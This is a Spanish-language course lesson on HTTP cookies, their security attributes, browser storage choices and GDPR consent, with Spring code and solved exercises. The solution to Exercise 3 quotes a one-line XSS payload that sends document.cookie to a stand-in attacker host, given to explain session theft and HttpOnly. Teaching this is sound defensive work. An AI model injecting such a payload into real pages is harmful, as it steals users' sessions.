# Cookies y almacenamiento en el cliente

> Una cookie es un trozo de texto que el servidor le pide al navegador que guarde y que el navegador **devuelve solo** en cada petición. Todo el seguimiento de internet y buena parte de sus problemas de privacidad caben en esa frase.

## 1. Cómo funcionan

```http
HTTP/1.1 200 OK
Set-Cookie: idioma=es; Max-Age=31536000; Path=/; SameSite=Lax
```
```http
GET /productos HTTP/1.1
Cookie: idioma=es
```

El navegador la manda **automáticamente** en cada petición al mismo dominio. Eso es cómodo y es exactamente lo que hace posible el ataque CSRF.

```java
@GetMapping("/preferencias/idioma/{codigo}")
public ResponseEntity<Void> fijarIdioma(@PathVariable String codigo) {
    var cookie = ResponseCookie.from("idioma", codigo)
            .httpOnly(false)                 // el JS necesita leerla
            .secure(true)                    // solo por HTTPS
            .sameSite("Lax")
            .path("/")
            .maxAge(Duration.ofDays(365))
            .build();
    return ResponseEntity.noContent()
            .header(HttpHeaders.SET_COOKIE, cookie.toString()).build();
}

@GetMapping("/preferencias")
public Map<String, String> leer(@CookieValue(value = "idioma", defaultValue = "es") String idioma) {
    return Map.of("idioma", idioma);
}
```

## 2. Los atributos, que son lo importante

| Atributo | Para qué | Si falta |
|---|---|---|
| `HttpOnly` | El JavaScript **no** puede leerla | Un XSS roba la sesión |
| `Secure` | Solo viaja por HTTPS | Se puede interceptar en claro |
| `SameSite` | Controla el envío entre sitios | Puerta abierta a CSRF |
| `Max-Age` / `Expires` | Cuánto vive | De sesión: muere al cerrar |
| `Path` / `Domain` | Dónde se envía | Se manda de más |

`SameSite` con detalle:

- **`Strict`** — nunca se envía desde otro sitio. Máxima seguridad; rompe el «venir de un enlace externo ya logueado».
- **`Lax`** — se envía en navegaciones normales (`GET` de nivel superior) pero no en `POST` entre sitios. **El valor por defecto de los navegadores modernos y el que quieres casi siempre.**
- **`None`** — se envía siempre; obliga a `Secure`. Solo para integraciones entre dominios.

!!! danger "La cookie de sesión, siempre `HttpOnly`"
    Si un atacante consigue ejecutar JavaScript en tu página (XSS) y la cookie **no** es `HttpOnly`, hace `document.cookie` y se lleva la sesión de todos tus usuarios. Con `HttpOnly` el robo directo deja de ser posible. Es una línea de configuración y evita el ataque más rentable que existe.

## 3. Dónde puede guardar el navegador

| Sitio | Tamaño | ¿Va al servidor? | ¿Lo lee el JS? | Cuándo |
|---|---|---|---|---|
| **Cookie** | ~4 KB | **Sí, siempre** | Si no es `HttpOnly` | El servidor necesita el dato |
| `localStorage` | ~5-10 MB | No | Sí | Preferencias de interfaz |
| `sessionStorage` | ~5 MB | No | Sí | Datos de una pestaña |
| IndexedDB | Cientos de MB | No | Sí | Datos sin conexión |

La pregunta que decide es: **¿lo necesita el servidor?** Si sí, cookie. Si no, `localStorage` y ahorras ancho de banda en cada petición.

!!! warning "El token JWT, ¿dónde?"
    En `localStorage` es cómodo pero cualquier XSS lo roba. En una cookie `HttpOnly` + `Secure` + `SameSite=Strict` el XSS no lo alcanza, pero vuelve el CSRF y hay que protegerse. **No hay opción perfecta**; lo que no vale es no haberlo pensado. La combinación más defendible hoy: cookie `HttpOnly` para el *refresh token* y token de acceso en memoria.

## 4. RGPD en tres líneas

Las cookies **técnicas** —sesión, carrito, idioma, equilibrado de carga— no necesitan consentimiento. Las de **analítica, personalización o publicidad**, sí: consentimiento previo, informado, granular y tan fácil de rechazar como de aceptar. El banner que solo tiene «Aceptar» es ilegal.

---

## Pruébalo ahora (20 min)

!!! reto "Trabaja tú ahora"
    Este bloque se hace **en clase, en tu equipo**. No se entrega ni puntúa: es la práctica que hace que el examen te salga.

**Parte 1.** Implementa los dos endpoints de idioma y compruébalos:

```bash
curl -i -c g.txt localhost:8080/preferencias/idioma/en | grep -i set-cookie
curl -b g.txt localhost:8080/preferencias
cat g.txt
```

**Parte 2 — Mira los atributos.** Abre cualquier web con las herramientas de desarrollo → Aplicación → Cookies. Localiza una con `HttpOnly` y otra sin él, y razona por qué cada una es como es.

**Parte 3 — Demuestra `HttpOnly`.** Con dos cookies, una `httpOnly(true)` y otra `false`, ejecuta `document.cookie` en la consola del navegador: solo verás una. Ese es todo el mecanismo.

**Parte 4 — Cuenta los bytes.** Pon una cookie de 3 KB y observa en la pestaña de red que **viaja en todas** las peticiones, incluidas las de imágenes y CSS. Ahí se entiende por qué las preferencias de interfaz van en `localStorage`.

---

## Ejercicios (con solución)

### Ejercicio 1 — Cookie o localStorage
(a) token de sesión · (b) tema claro/oscuro que aplica el CSS · (c) idioma que usa el servidor para traducir el HTML · (d) borrador de un formulario largo · (e) consentimiento de cookies.

??? success "Solución"

    (a) <b>cookie</b> <code>HttpOnly</code> (o token en memoria) · (b) <code>localStorage</code>: solo lo necesita el navegador · (c) <b>cookie</b>: el servidor tiene que leerlo para renderizar · (d) <code>sessionStorage</code> o <code>localStorage</code>, según si debe sobrevivir al cierre · (e) <b>cookie</b>, porque el servidor decide qué scripts inyecta.


### Ejercicio 2 — Los tres atributos
Escribe la cookie de sesión de una aplicación bancaria y justifica cada atributo.

??? success "Solución"

    ```java
    ResponseCookie.from("SESION", id)
        .httpOnly(true)        // un XSS no puede leerla
        .secure(true)          // nunca viaja en claro
        .sameSite("Strict")    // ningún sitio externo la envía: sin CSRF
        .path("/")
        .maxAge(Duration.ofMinutes(15))   // caducidad corta: banca
        .build();
    ```
    En banca se elige <code>Strict</code> aunque incomode —venir desde un enlace externo obliga a volver a entrar— porque el riesgo lo justifica. En una tienda, <code>Lax</code>.


### Ejercicio 3 — El ataque
Explica cómo un XSS roba una sesión y qué atributo lo impide.

??? success "Solución"

    El atacante logra inyectar JavaScript en la página —un comentario sin escapar, por ejemplo— y ejecuta <code>fetch('https://malo.com?c=' + document.cookie)</code>. Con esa cookie suplanta al usuario sin saber su contraseña. <b><code>HttpOnly</code></b> hace que <code>document.cookie</code> no la vea. No arregla el XSS —eso se corrige escapando la salida— pero le quita el botín más valioso.


### Ejercicio 4 — El banner ilegal
Un banner con un botón «Aceptar» grande y un enlace pequeño «Configurar». ¿Cumple el RGPD?

??? success "Solución"

    <b>No.</b> Rechazar debe ser <b>tan fácil como aceptar</b>: hace falta un botón «Rechazar» al mismo nivel visual. Además, las cookies no técnicas <b>no pueden instalarse antes</b> del consentimiento, y este debe ser granular por finalidad. Las técnicas —sesión, carrito, idioma— no necesitan banner.

